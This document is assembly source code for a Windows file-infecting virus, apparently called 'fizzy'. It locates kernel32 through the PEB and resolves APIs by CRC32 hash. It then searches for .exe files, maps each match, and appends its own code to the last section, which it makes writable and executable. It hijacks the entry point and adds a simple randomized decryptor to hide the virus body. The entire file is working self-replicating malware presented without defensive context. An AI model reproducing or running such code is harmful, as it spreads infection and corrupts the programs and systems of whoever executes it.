.386
.model  flat, stdcall
include fizzy.inc
.code
assume  fs:nothing

fizzy_code      proc    near

fizzy_begin     label    near                ;//eax <- imagebase, ebx <- PEB address, is set by decryptor
        lea     eax, dword ptr [edi + offset message - 400000h]
                                             ;//reset everytime a file is infected
        push    eax
        call    find_krn
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     fs:[eax]
        pop     eax
        ret

find_krn        label    near
        xor     edx, edx
        push    fs:[edx]
        mov     fs:[edx], esp
        mov     eax, dword ptr [ebx + PEB_LDR_DATA]
        mov     esi, dword ptr [eax + 0 + InLoadOrderModuleList]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        call    push_crctbl

;//-------------------------------------------------------------------------------
;//API CRC list
;//-------------------------------------------------------------------------------

        dd      0efc7ea74h
        dd      02519b15ah
        dd      0391ab6afh
        dd      0553b5c78h
        dd      0b41b926ch
        dd      0c9ebd5ceh
        dd      075272948h
        dd      0a89b382fh
        dd      0b09315f4h
        db      2ah                          ;//1 byte terminator
                                             ;//no CRC listed can begin with 2A
        db      2eh, 65h, 78h, 65h, 0        ;//executable file
        
push_crctbl     label    near
        pop     esi
        mov     ebp, dword ptr [eax + 18h]

;//-------------------------------------------------------------------------------
;//walk lists
;//-------------------------------------------------------------------------------

walk_dll        label    near
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        mov     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]
        add     ebx, ebp

walk_names      label    near
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, ebp
        mov     edi, dword ptr [edi + edx * 4]
        add     edi, ebp
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8  
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        je      l_res
        inc     edx
        cmp     dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.NumberOfNames], edx
        jne     walk_names
        int     3

;//-------------------------------------------------------------------------------
;//resolve API address
;//----
;//find exe files
;//-------------------------------------------------------------------------------

l_res           label    near
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        add     edi, ebp
        movzx   edi, word ptr [edi + edx * 2]
        mov     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        add     eax, ebp
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        xor     edx, edx
        lods    dword ptr [esi]
        cmp     byte ptr [esi], "*"
        jne     walk_dll
        xchg    esi, eax
        mov     esi, esp
        enter   sizeof WIN32_FIND_DATA + sizeof IMAGE_DOS_HEADER.e_magic, 0
        mov     edi, esp
        push    esp
        push    eax
        call    esFindFirstFileA
        xchg    ebp, eax
        xor     ebx, ebx

;//-------------------------------------------------------------------------------
;//map view
;//-------------------------------------------------------------------------------

create_map      label    near
        pushad
        push    ebx
        push    ebx
        push    3  
        push    ebx
        push    ebx
        push    3                            ;//GENERIC_READ or GENERIC_WRITE
        lea     edx, dword ptr [edi + WIN32_FIND_DATA.cFileName]
        push    edx
        call    esCreateFileA
        push    eax
        push    eax
        push    ebx
        push    ebx
        mov     ebp, dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow]
        push    ebp
        push    eax
        push    ebx
        add     ebp, 1012h
        push    ebp
        push    ebx
        push    4                            ;//PAGE_READWRITE
        push    ebx
        push    eax
        call    esCreateFileMappingA
        push    eax
        push    ebp
        push    ebx
        push    ebx
        push    2                            ;//FILE_MAP_WRITE
        push    eax
        call    esMapViewOfFile
        push    eax
        pushad
        call    infect_pe32

delta_unmap     label    near
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    esUnmapViewOfFile
        call    dword ptr [esi + (offset infect_pe32 - offset call_outseh) - 1]
        call    esSetFilePointer
        call    esSetEndOfFile
        call    dword ptr [esi + (offset infect_pe32 - offset call_outseh) - 1]
        popad
        push    edi
        push    ebp
        call    esFindNextFileA
        test    eax, eax
        jnz     create_map

call_outseh     label    near
        int     3                            ;//solar ghosts come kiss the moon goodnight

infect_pe32     label    near

;//-------------------------------------------------------------------------------
;//MZ and PE signatures
;//32-bit machine. GUI mode
;//no appended data (infection sign, attribute certificates, debug info, etc)
;//-------------------------------------------------------------------------------

        push    fs:[ebx]
        mov     fs:[ebx], esp
        cmp     word ptr [eax], "ZM"
        jne     call_outseh
        mov     ebp, eax
        add     eax, dword ptr [eax + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [eax], "EP"
        jne     call_outseh
        cmp     word ptr [eax + IMAGE_NT_HEADERS.FileHeader.Machine], IMAGE_FILE_MACHINE_I386
        jne     call_outseh
        cmp     word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.Subsystem], IMAGE_SUBSYSTEM_WINDOWS_CUI
        jne     call_outseh
        movzx   edx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
        imul    ecx, ecx, sizeof IMAGE_SECTION_HEADER
        lea     esi, dword ptr [eax + edx + IMAGE_NT_HEADERS.OptionalHeader - sizeof IMAGE_SECTION_HEADER]
        add     esi, ecx
        mov     ecx, dword ptr [esi + IMAGE_SECTION_HEADER.PointerToRawData]
        mov     edx, dword ptr [esi + IMAGE_SECTION_HEADER.SizeOfRawData]
        add     ecx, edx
        cmp     dword ptr [edi + WIN32_FIND_DATA.nFileSizeLow], ecx
        jne     call_outseh
        mov     bh, 10h
        stc
        adc     dword ptr [esp + REG_ESP * REG_EDI + 18h], ebx
        lea     edi, dword ptr [ebp + ecx]
        mov     ecx, dword ptr [esi + IMAGE_SECTION_HEADER.Misc.VirtualSize]
        add     dword ptr [esi + IMAGE_SECTION_HEADER.Misc.VirtualSize], ebx
        add     dword ptr [esi + IMAGE_SECTION_HEADER.SizeOfRawData], ebx
        add     dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], ebx
        add     edx, dword ptr [esi + IMAGE_SECTION_HEADER.VirtualAddress]
        mov     ebx, edx
        or      dword ptr [esi + IMAGE_SECTION_HEADER.Characteristics], IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE
        mov     ecx, dword ptr [esp + 4]
        lea     esi, dword ptr [ecx - (offset delta_unmap - offset fizzy_begin)]
        mov     ebp, dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
        mov     dword ptr [esi + 2], ebp
        push    esi
        push    edx
        push    eax
        push    esi
        call    addsize_field

;//-------------------------------------------------------------------------------
;//no MMX/SSE instruction this time
;//pure x86 code... ;)
;//-------------------------------------------------------------------------------


enter_decsize   label    near
        pop     esi
        mov     edi, dword ptr [ebx + 8]
        mov     ecx, (offset fizzy_end - offset fizzy_begin) / 4
        push    esi
        mov     edx, esp

enter_decloop   label    near
        lods    dword ptr [esi]
        lea     ebp, dword ptr [edi + eax]
        enter   4, 2                         ;//so, enter stage right, might in hand...
        add     esp, 8
        pop     dword ptr [esi - 4]
        loop    enter_decloop
        mov     esp, edx
        ret
enter_decend    label    near


;//-------------------------------------------------------------------------------
;//make decryptor
;//engine randomly picks dwords from virus code and places them randomly. very simple
;//-------------------------------------------------------------------------------

addsize_field   label    near
        pop     esi
        mov     al, 0e8h
        stos    byte ptr [edi]
        mov     eax, (offset fizzy_end - offset fizzy_begin) * 2
        stos    dword ptr [edi]
        push    edi
        xchg    eax, ecx
        xor     eax, eax
        rep     stos byte ptr [edi]
        push    offset enter_decend - offset enter_decsize
        pop     ecx
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     edi
        pop     esi
        mov     cl, (offset fizzy_end - offset fizzy_begin) / 4
        lea     ebp, dword ptr [edi + (offset fizzy_end - offset fizzy_begin)]
        
yuk_degeri      label    near
        push    (offset fizzy_end - offset fizzy_begin) / 4
        call    random
        cdq
        cmp     dword ptr [ebp + eax * 4], edx
        jne     yuk_degeri
        xchg    edx, eax
        lods    dword ptr [esi]
        mov     dword ptr [ebp + edx * 4], eax
        lea     eax, dword ptr [ebx + edx * 4 + STACKSIZE + (offset fizzy_end - offset fizzy_begin) + 5]
        stos    dword ptr [edi]
        loop    yuk_degeri
        pop     eax
        pop     edx
        pop     esi
        xchg    dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint], edx
        mov     dword ptr [esi + 2], edx
        mov     cl, IMAGE_OHDD32_LOAD_CONFIG_TABLE
        fldz
        fstp    qword ptr [eax + ecx]
        int     3

;//-------------------------------------------------------------------------------
;//MASM32 random number generator (pretty simple), made position independent code
;//-------------------------------------------------------------------------------

nrandom         proc
        mov     eax, "****"                  ;//seed value

delta_seed      label    near
        test    eax, 80000000h
        jz      sb
        add     eax, 7fffffffh
sb:     xor     edx, edx
        mov     ecx, 1f31dh
        div     ecx
        xchg    ecx, eax
        mov     eax, 41a7h
        mul     edx
        mov     edx, ecx
        xchg    ecx, eax
        mov     eax, 0b11h
        mul     edx
        sub     ecx, eax
        xchg    eax, ecx
        pop     ecx
        mov     dword ptr [ecx - (offset delta_rngoff - offset nrandom) + 1], eax
        push    ecx
        ret
nrandom         endp

random          proc                         ;//get on range random number - not part of MASM32 Lib
        push    ecx
        push    edx
        call    nrandom

delta_rngoff    label    near
        xor     edx, edx
        div     dword ptr [esp + 0ch]
        xchg    eax, edx
        pop     edx
        pop     ecx
        retn    4
random          endp
        db      (((offset fizzy_end - offset fizzy_begin) and -4) + 4)
fizzy_end       label    near
fizzy_code      endp
code_exe        proc     near
        call    GetTickCount
        mov     dword ptr [delta_seed - 4], eax
        mov     edi, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK_IMAGE_BASE]
        jmp     fizzy_begin
        
message         proc     near
        xor     ebx, ebx
        push    "*C"
        push    esp 
        pop     ecx
        push    ebx
        push    ebx
        push    ebx
        push    ecx
        push    ebx
        call    MessageBox 
        call    ExitProcess
message         endp
code_exe        endp
end     code_exe